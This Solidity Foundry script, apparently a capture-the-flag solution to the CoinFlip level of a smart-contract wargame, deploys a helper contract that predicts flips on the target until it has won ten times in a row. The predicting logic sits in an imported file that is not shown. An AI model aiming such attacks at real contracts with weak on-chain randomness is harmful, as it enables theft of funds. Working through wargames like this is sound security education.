// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {GetInstanceAddress} from "script/HelperFunctions.s.sol";
import {CoinFlipGuess} from "../src/Level3.sol";

interface ICoinFlip {
    function consecutiveWins() external returns (uint256);
}

contract Exploit is Script, GetInstanceAddress {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        ICoinFlip targetContract = ICoinFlip(targetContractAddress);

        if (targetContract.consecutiveWins() < 10) {
            vm.startBroadcast();

            CoinFlipGuess coinFlipGuess = new CoinFlipGuess();
            coinFlipGuess.flip(targetContractAddress);

            vm.stopBroadcast();
        } else {
            revert("Already won 10 times");
        }

        console.log("consecutiveWins: %s", targetContract.consecutiveWins());
    }
}
